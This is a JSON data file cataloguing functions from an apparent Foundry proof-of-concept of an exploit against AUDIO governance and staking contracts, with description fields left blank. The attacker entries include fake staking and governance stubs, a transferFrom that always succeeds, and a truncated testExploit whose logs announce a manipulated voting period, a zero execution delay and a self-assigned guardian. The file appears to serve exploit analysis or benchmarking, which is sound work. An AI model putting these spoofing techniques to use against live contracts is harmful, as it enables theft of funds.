[
  {
    "contract/interface": "IStaking",
    "source_type": "victim_contract",
    "function_name": "initialize",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "getContract",
    "original_code": "    function getContract(\n        bytes32 _targetContractRegistryKey\n    ) external returns (address) {\n        return AUDIO;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "getExecutionDelay",
    "original_code": "    function getExecutionDelay() external view returns (uint256) {\n        return 0;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "getVotingPeriod",
    "original_code": "    function getVotingPeriod() external view returns (uint256) {\n        return 0;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "isGovernanceAddress",
    "original_code": "    function isGovernanceAddress() external view returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15_201_793); // Fork mainnet at block 15201793\n        cheat.label(AUDIO, \"AUDIO\");\n        cheat.label(uniswap, \"UniswapV2Router02\");\n        cheat.label(governance, \"GovernanceProxy\");\n        cheat.label(staking, \"Stacking\");\n        cheat.label(delegatemanager, \"DelegateManagerV2\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        console.log(\"---------- Start from Block %s ----------\", block.number);\n        emit log_named_decimal_uint(\"Attacker ETH Balance\", attacker.balance, 18);\n\n        console.log(\"-------------------- Tx1 --------------------\");\n        console.log(\"Modify configurations...\");\n        console.log(\"-> votingPeriod : 3 blocks\");\n        console.log(\"-> executionDelay : 0 block\");\n        console.log(\"-> guardianAddress : self\");\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address, address, uint256) external pure returns (bool) {\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "validateAccountStakeBalance",
    "original_code": "    function validateAccountStakeBalance(\n        address\n    ) external pure {}\n\n",
    "description": ""
  },
  {
    "contract/interface": "IGovernence",
    "source_type": "victim_contract",
    "function_name": "evaluateProposalOutcome",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGovernence",
    "source_type": "victim_contract",
    "function_name": "submitProposal",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IGovernence",
    "source_type": "victim_contract",
    "function_name": "submitVote",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDelegateManagerV2",
    "source_type": "victim_contract",
    "function_name": "delegateStake",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDelegateManagerV2",
    "source_type": "victim_contract",
    "function_name": "setServiceProviderFactoryAddress",
    "original_code": "",
    "description": ""
  }
]